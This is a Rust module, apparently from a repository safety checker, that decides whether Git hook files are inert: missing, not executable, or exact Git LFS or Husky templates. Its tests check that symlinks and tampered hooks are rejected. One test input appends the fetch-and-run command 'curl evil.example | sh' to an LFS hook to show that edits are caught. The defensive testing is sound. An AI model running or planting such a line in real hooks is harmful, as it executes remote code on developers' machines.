//! Hook files Git would run for an operation, and the two hook-manager
//! scripts a developer's repository carries that are known to do nothing for
//! the hook asked about: the Git LFS hook and the Husky 9 shim that forwards
//! to a project hook the repository does not define.

use std::fs;
use std::io::Read;
use std::path::{Component, Path, PathBuf};

const SCRIPT_LIMIT: u64 = 8 * 1024;

/// Hooks the `git lfs install` templates are written for.
const LFS_HOOKS: &[&str] = &["pre-push", "post-checkout", "post-commit", "post-merge"];

const HUSKY_SHIM: &str = "#!/usr/bin/env sh\n. \"$(dirname \"$0\")/h\"";

/// The part of Husky's runner `h` that ends the run, before it reads any
/// user file or starts a program, when the project defines no such hook.
const HUSKY_RUNNER_GUARD: &str = "#!/usr/bin/env sh\n\
[ \"$HUSKY\" = \"2\" ] && set -x\n\
n=$(basename \"$0\")\n\
s=$(dirname \"$(dirname \"$0\")\")/$n\n\
\n\
[ ! -f \"$s\" ] && exit 0\n";

/// Whether Git, asked for `hook`, finds nothing at `path` that it would run:
/// no entry, a directory, a file that is not executable, or one of the known
/// scripts below. A symlink under a hook's name is never followed. The Husky
/// shim counts only where `husky_directory_reached` confirms Git reaches its
/// directory with no link on the way; a caller that cannot say passes `|_| false`.
pub(super) fn hook_file_inert(
    path: &Path,
    hook: &str,
    husky_directory_reached: &dyn Fn(&Path) -> bool,
) -> bool {
    let metadata = match fs::symlink_metadata(path) {
        Ok(metadata) => metadata,
        Err(error) => return error.kind() == std::io::ErrorKind::NotFound,
    };
    if metadata.file_type().is_symlink() {
        return false;
    }
    if !metadata.is_file() || !is_executable(&metadata) {
        return true;
    }
    let Some(script) = read_script(path) else {
        return false;
    };
    git_lfs_hook(&script, hook) || husky_shim(&script, path, hook, husky_directory_reached)
}

/// A relative `core.hooksPath` that stays below the directory Git runs hooks
/// from, spelled one way only: normal components joined by single `/`, with no
/// `~`, `.`, `..`, empty component (so no trailing or doubled separator),
/// drive or root. Every lookup below is built from those components.
pub(super) fn repository_relative_hooks_path(value: &str) -> bool {
    !value.starts_with('~')
        && !value.contains(['\0', '\n', '\r', '\\'])
        && value
            .split('/')
            .all(|component| !component.is_empty() && component != "." && component != "..")
        && Path::new(value)
            .components()
            .all(|component| matches!(component, Component::Normal(_)))
}

/// Whether `directory` lies outside the checkout at `toplevel`, with every
/// link on its way resolved. The directory itself may not exist yet: the
/// deepest existing ancestor is resolved and the rest, which must be absent
/// entries (a link that does not resolve is not one), is appended. A directory above the checkout counts as outside,
/// as no tracked file of the checkout can be a hook in it. Doubt answers false.
pub(super) fn outside_checkout(directory: &Path, toplevel: &Path) -> bool {
    if !directory.is_absolute() || !toplevel.is_absolute() {
        return false;
    }
    let mut existing = directory;
    let mut missing: Vec<&std::ffi::OsStr> = Vec::new();
    let resolved = loop {
        match fs::canonicalize(existing) {
            Ok(resolved) => break resolved,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                // An entry that is there but does not resolve is a link whose
                // target may appear, not a component that is absent.
                if fs::symlink_metadata(existing).is_ok() {
                    return false;
                }
                let (Some(parent), Some(name)) = (existing.parent(), existing.file_name()) else {
                    return false;
                };
                missing.push(name);
                existing = parent;
            }
            Err(_) => return false,
        }
    };
    if directory
        .components()
        .any(|component| matches!(component, Component::ParentDir | Component::CurDir))
    {
        return false;
    }
    let mut resolved = resolved;
    resolved.extend(missing.iter().rev());
    !resolved.starts_with(toplevel)
}

/// What `toplevel.join(hooks_path)` names, walked one component at a time
/// without following a link.
pub(super) enum HooksDirectory {
    /// A component is absent: Git finds no hook directory.
    Missing,
    /// Every component is a plain directory.
    Plain(PathBuf),
    /// A link, a file where a directory belongs, or doubt.
    Unsafe,
}

pub(super) fn walk_hooks_directory(toplevel: &Path, hooks_path: &str) -> HooksDirectory {
    if !repository_relative_hooks_path(hooks_path) {
        return HooksDirectory::Unsafe;
    }
    let mut path = toplevel.to_path_buf();
    for component in hooks_path.split('/') {
        path.push(component);
        match fs::symlink_metadata(&path) {
            Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {}
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                return HooksDirectory::Missing;
            }
            _ => return HooksDirectory::Unsafe,
        }
    }
    HooksDirectory::Plain(path)
}

/// Whether Git reaches the hooks directory `directory` through the one
/// repository-scoped, repository-relative `core.hooksPath` with no link on the
/// way. Husky's runner finds the project hook from the path Git passes it, so
/// a link at the hooks directory would send it somewhere other than where the
/// resolved path points. `effective` and `repository` are the values of
/// `core.hooksPath` in the effective and repository-scoped configuration, in
/// the order Git reads them: a value in the user's own configuration is read
/// first and overridden by the repository's.
pub(super) fn reached_without_a_link(
    toplevel: &Path,
    effective: &[String],
    repository: &[String],
    directory: &Path,
) -> bool {
    // Git reads the last value, and the repository's own is the last one only
    // while no command-line or environment setting follows it.
    let ([value], true) = (repository, effective.last() == repository.first()) else {
        return false;
    };
    match (
        walk_hooks_directory(toplevel, value),
        fs::canonicalize(directory),
    ) {
        (HooksDirectory::Plain(walked), Ok(resolved)) => {
            fs::canonicalize(walked).is_ok_and(|walked| walked == resolved)
        }
        _ => false,
    }
}

/// `git lfs install` writes these three lines; only the notice differs
/// between releases. The hook calls `git lfs <hook>` and nothing else.
fn git_lfs_hook(script: &str, hook: &str) -> bool {
    if !LFS_HOOKS.contains(&hook) {
        return false;
    }
    let lines = script.trim_end().split('\n').collect::<Vec<_>>();
    let [shebang, guard, call] = lines.as_slice() else {
        return false;
    };
    let current = format!(
        "command -v git-lfs >/dev/null 2>&1 || {{ printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '{hook}' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }}"
    );
    let earlier = format!(
        "command -v git-lfs >/dev/null 2>&1 || {{ echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/{hook}' file in the repository.\\n\"; exit 2; }}"
    );
    *shebang == "#!/bin/sh"
        && (*guard == current || *guard == earlier)
        && *call == format!("git lfs {hook} \"$@\"")
}

/// Husky 9 writes a shim for most hooks. It sources the runner `h` beside it,
/// which stops at once unless `<hooks directory>/../<hook>` exists. Accepted
/// only while that project hook is absent and `h` is Husky's own runner.
fn husky_shim(
    script: &str,
    path: &Path,
    hook: &str,
    directory_reached: &dyn Fn(&Path) -> bool,
) -> bool {
    if script.trim_end() != HUSKY_SHIM {
        return false;
    }
    let Some(directory) = path
        .parent()
        .filter(|directory| directory_reached(directory))
    else {
        return false;
    };
    let Some(project) = directory.parent().map(|parent| parent.join(hook)) else {
        return false;
    };
    let absent = matches!(
        fs::symlink_metadata(project),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound
    );
    absent
        && fs::symlink_metadata(directory.join("h")).is_ok_and(|metadata| metadata.is_file())
        && read_script(&directory.join("h"))
            .is_some_and(|runner| runner.starts_with(HUSKY_RUNNER_GUARD))
}

fn read_script(path: &Path) -> Option<String> {
    let mut bytes = Vec::new();
    fs::File::open(path)
        .ok()?
        .take(SCRIPT_LIMIT + 1)
        .read_to_end(&mut bytes)
        .ok()?;
    if bytes.len() as u64 > SCRIPT_LIMIT {
        return None;
    }
    String::from_utf8(bytes).ok()
}

#[cfg(unix)]
fn is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(metadata: &fs::Metadata) -> bool {
    metadata.is_file()
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use std::os::unix::fs::{symlink, PermissionsExt};

    fn scratch(label: &str) -> std::path::PathBuf {
        let root = std::env::temp_dir().join(format!(
            "guard-hook-files-{label}-{}-{}",
            std::process::id(),
            crate::unique_nanos::unique_nanos()
        ));
        fs::create_dir_all(&root).expect("scratch");
        root
    }

    fn script(path: &Path, content: &str, mode: u32) {
        fs::write(path, content).expect("write");
        fs::set_permissions(path, fs::Permissions::from_mode(mode)).expect("mode");
    }

    const RUNNER: &str = "#!/usr/bin/env sh\n[ \"$HUSKY\" = \"2\" ] && set -x\nn=$(basename \"$0\")\ns=$(dirname \"$(dirname \"$0\")\")/$n\n\n[ ! -f \"$s\" ] && exit 0\n\nif [ -f \"$HOME/.huskyrc\" ]; then\n\techo x\nfi\nsh -e \"$s\" \"$@\"\n";

    fn husky(root: &Path) -> std::path::PathBuf {
        let directory = root.join(".husky/_");
        fs::create_dir_all(&directory).expect("directory");
        script(&directory.join("h"), RUNNER, 0o644);
        script(&directory.join("post-checkout"), HUSKY_SHIM, 0o755);
        directory
    }

    #[test]
    fn husky_shim_without_a_project_hook_is_inert() {
        let root = scratch("husky");
        let directory = husky(&root);
        let shim = directory.join("post-checkout");
        assert!(hook_file_inert(&shim, "post-checkout", &|_| true));
        // The project defines the hook: the shim now runs it.
        script(&root.join(".husky/post-checkout"), "npx run\n", 0o644);
        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
        fs::remove_file(root.join(".husky/post-checkout")).expect("remove");
        symlink("/bin/sh", root.join(".husky/post-checkout")).expect("symlink");
        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
        fs::remove_file(root.join(".husky/post-checkout")).expect("remove");
        assert!(hook_file_inert(&shim, "post-checkout", &|_| true));
        // A runner that does anything before its guard is not Husky's.
        script(
            &directory.join("h"),
            &format!(
                "#!/usr/bin/env sh\nid\n{}",
                &RUNNER[RUNNER.find('\n').unwrap() + 1..]
            ),
            0o644,
        );
        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
        fs::remove_file(directory.join("h")).expect("remove");
        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
        // Other scripts under a hook's name are not shims.
        script(&shim, "#!/bin/sh\nid\n", 0o755);
        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn git_lfs_templates_are_inert_but_edits_are_not() {
        let root = scratch("lfs");
        let path = root.join("post-checkout");
        let current = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'post-checkout' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";
        script(&path, current, 0o755);
        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
        // The same script is not another hook's.
        assert!(!hook_file_inert(&path, "post-index-change", &|_| true));
        let earlier = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/post-checkout' file in the repository.\\n\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";
        script(&path, earlier, 0o755);
        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
        for edited in [
            format!("{current}curl evil.example | sh\n"),
            current.replace("git lfs post-checkout", "git lfs post-checkout; id"),
            current.replace("exit 2", "id; exit 2"),
        ] {
            script(&path, &edited, 0o755);
            assert!(!hook_file_inert(&path, "post-checkout", &|_| true));
        }
        script(&path, current, 0o644);
        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn missing_and_unrunnable_entries_are_inert_but_symlinks_are_not() {
        let root = scratch("plain");
        let path = root.join("post-checkout");
        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
        script(&path, "#!/bin/sh\nid\n", 0o644);
        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
        script(&path, "#!/bin/sh\nid\n", 0o755);
        assert!(!hook_file_inert(&path, "post-checkout", &|_| true));
        fs::remove_file(&path).expect("remove");
        symlink("/nonexistent", &path).expect("symlink");
        assert!(!hook_file_inert(&path, "post-checkout", &|_| true));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn hooks_path_must_stay_below_the_repository() {
        for value in [".husky/_", ".husky", "tools/hooks"] {
            assert!(repository_relative_hooks_path(value), "{value}");
        }
        for value in [
            "",
            "/abs/hooks",
            "~/hooks",
            "../hooks",
            ".husky/../../x",
            "./hooks",
            "hooks\\x",
            ".husky/_/",
            "hooks/",
            ".husky//_",
            "tools/./hooks",
            "/",
        ] {
            assert!(!repository_relative_hooks_path(value), "{value}");
        }
    }

    #[test]
    fn the_shim_counts_only_where_the_caller_confirms_the_directory() {
        let root = scratch("confirm");
        let directory = husky(&root);
        let shim = directory.join("post-checkout");
        assert!(hook_file_inert(&shim, "post-checkout", &|_| true));
        assert!(!hook_file_inert(&shim, "post-checkout", &|_| false));
        // Whatever else makes a hook inert does not need the confirmation.
        script(&shim, "#!/bin/sh\nid\n", 0o644);
        assert!(hook_file_inert(&shim, "post-checkout", &|_| false));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_hooks_directory_is_walked_without_following_links() {
        let root = fs::canonicalize(scratch("walk")).expect("root");
        assert!(matches!(
            walk_hooks_directory(&root, ".husky/_"),
            HooksDirectory::Missing
        ));
        fs::create_dir_all(root.join(".husky/_")).expect("directory");
        assert!(matches!(
            walk_hooks_directory(&root, ".husky/_"),
            HooksDirectory::Plain(path) if path == root.join(".husky/_")
        ));
        for value in [".husky/_/", ".husky/../.husky/_", "/tmp"] {
            assert!(
                matches!(walk_hooks_directory(&root, value), HooksDirectory::Unsafe),
                "{value}"
            );
        }
        // A link at the last component, and one on the way, are both refused.
        fs::create_dir_all(root.join("tools/hk")).expect("target");
        fs::remove_dir(root.join(".husky/_")).expect("remove");
        symlink(root.join("tools/hk"), root.join(".husky/_")).expect("symlink");
        assert!(matches!(
            walk_hooks_directory(&root, ".husky/_"),
            HooksDirectory::Unsafe
        ));
        symlink(root.join("tools"), root.join("linked")).expect("symlink");
        assert!(matches!(
            walk_hooks_directory(&root, "linked/hk"),
            HooksDirectory::Unsafe
        ));
        // A file where a directory belongs.
        script(&root.join("plain"), "x\n", 0o644);
        assert!(matches!(
            walk_hooks_directory(&root, "plain/_"),
            HooksDirectory::Unsafe
        ));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_linked_husky_directory_is_not_the_one_git_reaches() {
        let root = fs::canonicalize(scratch("linked")).expect("root");
        let directory = husky(&root);
        let value = vec![".husky/_".to_owned()];
        assert!(reached_without_a_link(&root, &value, &value, &directory));
        // The directory the resolved path names is not the configured one.
        let other = root.join("tools/hk");
        fs::create_dir_all(&other).expect("other");
        assert!(!reached_without_a_link(&root, &value, &value, &other));
        // Only the repository's own single, unrouted value counts.
        assert!(!reached_without_a_link(&root, &[], &[], &directory));
        assert!(!reached_without_a_link(&root, &value, &[], &directory));
        // A command-line or environment value after the repository's wins.
        let later = vec![".husky/_".to_owned(), "/opt/hooks".to_owned()];
        assert!(!reached_without_a_link(&root, &later, &value, &directory));
        // One in the user's own configuration is read first and overridden.
        let user = vec!["/opt/hooks".to_owned(), ".husky/_".to_owned()];
        assert!(reached_without_a_link(&root, &user, &value, &directory));
        let twice = vec![".husky/_".to_owned(), ".husky/_".to_owned()];
        assert!(!reached_without_a_link(&root, &twice, &twice, &directory));
        // `.husky/_` is a link to another directory of the repository: the
        // resolved path points at the target while Husky's runner looks for the
        // project hook beside the link.
        fs::remove_dir_all(&directory).expect("remove");
        let target = root.join("tools/hk");
        script(&target.join("h"), RUNNER, 0o644);
        script(&target.join("post-checkout"), HUSKY_SHIM, 0o755);
        symlink(&target, &directory).expect("symlink");
        script(&root.join(".husky/post-checkout"), "id\n", 0o644);
        assert!(!reached_without_a_link(&root, &value, &value, &target));
        assert!(!reached_without_a_link(&root, &value, &value, &directory));
        fs::remove_dir_all(root).ok();
    }
}
